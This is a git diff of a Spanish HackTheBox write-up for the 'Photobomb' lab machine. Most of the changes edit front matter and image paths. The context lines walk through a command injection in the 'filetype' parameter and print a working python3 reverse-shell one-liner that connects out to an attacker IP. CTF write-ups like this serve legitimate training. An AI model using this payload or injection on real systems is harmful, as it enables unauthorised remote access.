@@ -1,11 +1,13 @@
 ---
-title: HTB - Photobomb
-published: true
-categories: [HackTheBox, Writeup]
-tags: [HackTheBox, RCE, Path Hijacking]
+layout      : post
+title       : "Photobomb - HackTheBox"
+author      : l4nder
+image       : assets/images/HTB/Photobomb/Photobomb.jpg
+category    : [ HackTheBox ]
+tags        : [ Linux ]
 ---
 
-![Photobomb]({{ 'assets/HTB/Photobomb/machine.png' | relative_url }}){: .center-image }
+![Photobomb]({{ '/assets/images/HTB/Photobomb/machine.png' | relative_url }}){: .center-image }
 
 Hoy tocará explotar la máquina **Photobomb** de [HackTheBox](https://app.hackthebox.com/machines/photobomb), es de dificultad fácil. Haremos un `command injection` y para la escalada haremos un `Path Hijacking`
 
@@ -52,13 +54,13 @@ echo "10.10.11.182       photobomb.htb" | tee -a /etc/hosts
 Vemos una pagina de inicio con un redirect a `/printer`
 
 
- ![WebSite]({{ 'assets/HTB/Photobomb/main.png' | relative_url }}){: .center-image }
+ ![WebSite]({{ '/assets/images/HTB/Photobomb/main.png' | relative_url }}){: .center-image }
  _Web Site_
 
 
 Si intentamos acceder nos pedirá credenciales
 
- ![login]({{ 'assets/HTB/Photobomb/login.png' | relative_url }}){: .center-image }
+ ![login]({{ '/assets/images/HTB/Photobomb/login.png' | relative_url }}){: .center-image }
  _Log in_
 
 Podemos probar credenciales típicas por defecto, pero no resultará útil.
@@ -112,7 +114,7 @@ window.onload = init;
 ```
 Al copiar dicha cookie, podemos ver el panel `/printer`.
 
-![login]({{ 'assets/HTB/Photobomb/confirm.png' | relative_url }}){: .center-image }
+![login]({{ '/assets/images/HTB/Photobomb/confirm.png' | relative_url }}){: .center-image }
 _Log in_
 
 ## Explotación
@@ -121,12 +123,12 @@ En este apartado vemos unas imagenes las cuales podemos descargar y hacer peque�
 >Cambiarle la extensión y modicar el tamaño.
 
 
-![printer]({{ 'assets/HTB/Photobomb/printer.png' | relative_url }}){: .center-image }
+![printer]({{ '/assets/images/HTB/Photobomb/printer.png' | relative_url }}){: .center-image }
 _Printer_
 
 Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo
 
-![Burp]({{ 'assets/HTB/Photobomb/burp.png' | relative_url }}){: .center-image }
+![Burp]({{ '/assets/images/HTB/Photobomb/burp.png' | relative_url }}){: .center-image }
 _BurpSuite_
 
 Podemos ver si es vulnerable a un **Command injection**, pero antes que nada inicia un servidor con `python`
@@ -137,7 +139,7 @@ python -m http.server 80
 Mandamos la petición al `Repeater`, para ello presionamos `Ctrl + R`
 Si nos fijamos en los parametros podemos agregar `;` y añadir nuestro comando, se vería así
 
-![BurpSuite]({{ 'assets/HTB/Photobomb/burp1.png' | relative_url }}){: .center-image }
+![BurpSuite]({{ '/assets/images/HTB/Photobomb/burp1.png' | relative_url }}){: .center-image }
 _BurpSuite_
 
 Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro `filetype` es vulnerable, lo podemos comprobar en la petición
@@ -153,7 +155,7 @@ Probaremos con bash pero no funciona, así que podemos probar con python3 y esta
 ```python
 export RHOST="10.10.14.25";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
 ```
-![RCE]({{ 'assets/HTB/Photobomb/burp2.png' | relative_url }}){: .center-image }
+![RCE]({{ '/assets/images/HTB/Photobomb/burp2.png' | relative_url }}){: .center-image }
 _RCE_
 
 
